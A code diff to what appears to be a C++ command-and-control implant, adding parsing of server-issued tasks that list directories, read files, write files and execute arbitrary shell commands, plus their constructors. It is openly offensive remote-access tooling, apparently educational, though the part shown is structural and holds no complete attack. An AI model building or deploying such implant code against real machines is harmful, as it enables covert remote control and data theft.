@@ -3,6 +3,9 @@
  * file 'LICENSE', which is part of this source code package.
  */
 #include "implant.h"
+#include <sstream>
+#include <utility>
+#include <boost/uuid/uuid_io.hpp>
 
 // Note: from Chapter 20 of C++ Crash Course
 //       c.f. https://github.com/JLospinoso/ccc/blob/master/chapter_20/web_request.cpp
@@ -35,3 +38,43 @@ std::string make_request(std::string_view host,
     throw boost::system::system_error{ ec };
   return response;
 }
+
+Task parse_task_from(const boost::property_tree::ptree& task_tree) {
+  const auto type = task_tree.get_child("type").get_value<std::string>();
+  const auto id_str = task_tree.get_child("id").get_value<std::string>();
+  std::stringstream ss{ id_str };
+  boost::uuids::uuid id{};
+  ss >> id;
+  if (type == ListTask::key) {
+    return ListTask{ id,
+                     task_tree.get_child("path").get_value<std::string>(),
+                         task_tree.get_child("depth").get_value<uint8_t>() };
+  }
+  if (type == GetTask::key) {
+    return GetTask{ id, task_tree.get_child("path").get_value<std::string>() };
+  }
+  if (type == PutTask::key) {
+    return PutTask{ id, task_tree.get_child("path").get_value<std::string>(), task_tree.get_child("contents").get_value<std::string>() };
+  }
+  if (type == ExecuteTask::key) {
+    return ExecuteTask{ id, task_tree.get_child("command").get_value<std::string>()};
+  }
+  std::string error_msg{ "Illegal task type encountered: " };
+  error_msg.append(type);
+  throw std::logic_error{error_msg};
+}
+
+GetTask::GetTask(const boost::uuids::uuid &id, std::string path)
+    : id(id), path(std::move(path)) {}
+
+PutTask::PutTask(const boost::uuids::uuid &id, std::string path,
+                 std::string contents)
+    : id(id), path(std::move(path)), contents(std::move(contents)) {}
+
+ListTask::ListTask(const boost::uuids::uuid &id, std::string path,
+                   uint8_t depth)
+    : id(id), path(std::move(path)), depth(depth) {}
+
+ExecuteTask::ExecuteTask(const boost::uuids::uuid &id,
+                         std::string command)
+    : id(id), command(std::move(command)) {}
